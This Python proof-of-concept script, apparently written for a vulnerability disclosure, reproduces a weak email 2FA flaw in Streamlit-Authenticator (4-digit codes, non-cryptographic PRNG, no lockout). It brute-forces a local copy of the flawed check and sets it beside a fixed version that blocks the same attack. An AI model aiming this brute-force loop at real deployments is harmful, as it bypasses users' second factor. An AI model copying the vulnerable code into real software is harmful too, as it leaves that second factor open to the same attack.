#!/usr/bin/env python3
"""
FumbleFactor — Streamlit-Authenticator email-2FA brute-force bypass (proof of concept).

Faithful, self-contained reproduction of the exact vulnerable logic shipped by
`mkhorasani/Streamlit-Authenticator` (PyPI streamlit-authenticator <= 0.4.3), plus the
fixed counterpart. No network, no third-party deps.

Ground truth (master @ 078b8f6, v0.4.2/0.4.3):

  models/authentication_model.py:235
      two_factor_auth_code = Helpers.generate_random_string(length=4, letters=False,
                                                            punctuation=False)
      st.session_state[f'2FA_code_{widget}'] = self.encryptor.encrypt(two_factor_auth_code)

  utilities/helpers.py:76-100
      import random                                  # <-- Mersenne Twister, NOT secrets
      ...
      return ''.join(random.choice(letters) for i in range(length)).replace(' ','')

  controllers/authentication_controller.py:85-111
      def check_two_factor_auth_code(self, code, content=None, widget=None):
          if code == self.encryptor.decrypt(st.session_state[f'2FA_code_{widget}']):
              ... return True
          st.session_state[f'2FA_check_{widget}'] = False     # <-- NO lockout, NO expiry
          return False

Three independent weaknesses combine:
  1. CWE-330  — the "second factor" is a 4-digit code: 10^4 = 10,000 possibilities.
  2. CWE-338  — generated with the stdlib `random` module (Mersenne Twister), a
                non-cryptographic PRNG, not `secrets`.
  3. CWE-307  — `check_two_factor_auth_code` has no attempt counter, no lockout and no
                expiry, so every one of the 10,000 codes can be tried against the SAME
                stored code.

The demo below copies those functions verbatim (minus the Fernet encryption, which is
orthogonal to the bug and is replaced by a clearly-labelled reversible stand-in), then
shows that a brute-force attacker recovers the code in <= 10,000 guesses on the
vulnerable version, while the fixed version (secrets + 6 digits + attempt limit) blocks
the same attack.
"""

import base64
import secrets as _secrets  # only used by the FIXED implementation
import string
import random  # the vulnerable module

# ----------------------------------------------------------------------------
# Stand-in for the library's `Encryptor` (real one is cryptography.Fernet keyed by
# sha256(secret_key)). Encryption is NOT the bug; this trivial reversible codec only
# lets the demo mirror "ciphertext stored in session_state, plaintext compared after
# decrypt". Labelled clearly to avoid confusion.
# ----------------------------------------------------------------------------
class _EncryptorStub:
    def __init__(self, secret_key: str):
        self._key = secret_key

    def encrypt(self, s: str) -> str:
        return base64.urlsafe_b64encode(s.encode()).decode()

    def decrypt(self, s: str) -> str:
        return base64.urlsafe_b64decode(s.encode()).decode()


# ----------------------------------------------------------------------------
# VULNERABLE implementation (verbatim from the library)
# ----------------------------------------------------------------------------
class VulnerableAuthenticator:
    """Mirrors streamlit_authenticator.utilities.helpers.Helpers +
    streamlit_authenticator.controllers.authentication_controller.AuthenticationController."""

    def __init__(self):
        self.encryptor = _EncryptorStub("some_key")  # default secret_key='some_key'
        self.session_state = {}                       # stand-in for st.session_state

    # == utilities/helpers.py ==
    @staticmethod
    def generate_random_string(length=16, letters=True, digits=True, punctuation=True):
        charset = (
            (string.ascii_letters if letters else "")
            + (string.digits if digits else "")
            + ("".join(c for c in string.punctuation if c not in "<>") if punctuation else "")
        )
        return "".join(random.choice(charset) for _ in range(length)).replace(" ", "")

    # == models/authentication_model.py:224-238 ==
    def generate_two_factor_auth_code(self, email: str, widget: str = None) -> str:
        # length=4, letters=False, punctuation=False  ->  digits only, 10^4 space
        code = self.generate_random_string(length=4, letters=False, punctuation=False)
        self.session_state[f"2FA_code_{widget}"] = self.encryptor.encrypt(code)
        # real code then emails `code` to the user
        return code

    # == controllers/authentication_controller.py:85-111 ==
    def check_two_factor_auth_code(self, code: str, widget: str = None) -> bool:
        stored = self.encryptor.decrypt(self.session_state[f"2FA_code_{widget}"])
        if code == stored:
            self.session_state[f"2FA_check_{widget}"] = True
            del self.session_state[f"2FA_code_{widget}"]
            return True
        self.session_state[f"2FA_check_{widget}"] = False  # no lockout, no expiry
        return False


# ----------------------------------------------------------------------------
# FIXED implementation (secrets + 6 digits + attempt limit)
# ----------------------------------------------------------------------------
class FixedAuthenticator(VulnerableAuthenticator):
    MAX_2FA_ATTEMPTS = 5

    def __init__(self):
        super().__init__()
        self._attempts = {}

    def generate_two_factor_auth_code(self, email: str, widget: str = None) -> str:
        # secrets.choice over string.digits -> cryptographically secure, 6 digits
        code = "".join(_secrets.choice(string.digits) for _ in range(6))
        self.session_state[f"2FA_code_{widget}"] = self.encryptor.encrypt(code)
        self._attempts[widget] = 0
        return code

    def check_two_factor_auth_code(self, code: str, widget: str = None) -> bool:
        self._attempts[widget] = self._attempts.get(widget, 0) + 1
        if self._attempts[widget] > self.MAX_2FA_ATTEMPTS:
            raise PermissionError("too many 2FA attempts (lockout)")
        stored = self.encryptor.decrypt(self.session_state[f"2FA_code_{widget}"])
        if code == stored:
            self.session_state[f"2FA_check_{widget}"] = True
            del self.session_state[f"2FA_code_{widget}"]
            return True
        return False


# ----------------------------------------------------------------------------
# Demonstration
# ----------------------------------------------------------------------------
def _code_space(charset, length) -> int:
    return len(charset) ** length


def main() -> int:
    ok = True

    print("=" * 72)
    print("FumbleFactor — Streamlit-Authenticator weak email 2FA (brute-force)")
    print("=" * 72)

    # --- 1. keyspace comparison -------------------------------------------
    vuln = VulnerableAuthenticator()
    fixed = FixedAuthenticator()

    vuln_space = _code_space(string.digits, 4)
    fixed_space = _code_space(string.digits, 6)
    print(f"\n[1] 2FA keyspace")
    print(f"    vulnerable: generate_random_string(length=4, letters=False, "
          f"punctuation=False) -> 10^{len('0000')} = {vuln_space:,} codes")
    print(f"    fixed     : secrets.choice(string.digits) x 6           -> {fixed_space:,} codes")
    assert vuln_space == 10_000

    # --- 2. PRNG used ------------------------------------------------------
    print(f"\n[2] PRNG source")
    print(f"    vulnerable module: 'random' (CPython Mersenne Twister, seeded from "
          f"os.urandom) — CWE-338, NOT secrets")
    print(f"    fixed module     : 'secrets' (os.urandom / CSPRNG)")

    # --- 3. brute-force the vulnerable code --------------------------------
    print(f"\n[3] Brute force against vulnerable 2FA (no lockout, no expiry)")
    vuln_code = vuln.generate_two_factor_auth_code("victim@example.com", "login")
    print(f"    server-side code (attacker cannot read email): {vuln_code!r}")
    guesses = 0
    found = False
    for n in range(vuln_space):
        guesses += 1
        if vuln.check_two_factor_auth_code(f"{n:04d}", "login"):
            found = True
            break
    print(f"    -> recovered {vuln_code!r} after {guesses} guesses "
          f"(<= {vuln_space:,} guaranteed)")
    assert found and guesses <= vuln_space
    print("    VULNERABLE CONFIRMED: second factor bypassed with plain brute force")
    ok = ok and found

    # --- 4. brute force blocked by the fix ---------------------------------
    print(f"\n[4] Same attack against fixed 2FA (secrets + 6 digits + 5-attempt lockout)")
    fixed_code = fixed.generate_two_factor_auth_code("victim@example.com", "login")
    print(f"    server-side code: {fixed_code!r}")
    blocked = False
    try:
        for n in range(fixed_space):
            fixed.check_two_factor_auth_code(f"{n:06d}", "login")
    except PermissionError:
        blocked = True
    print(f"    -> lockout triggered after {fixed.MAX_2FA_ATTEMPTS} attempts; "
          f"brute force of {fixed_space:,} codes BLOCKED")
    assert blocked
    print("    FIXED BLOCKS: second factor survives brute force")
    ok = ok and blocked

    print("\n" + "=" * 72)
    print("RESULT:", "VULNERABILITY CONFIRMED + FIX VERIFIED" if ok else "FAILED")
    print("=" * 72)
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
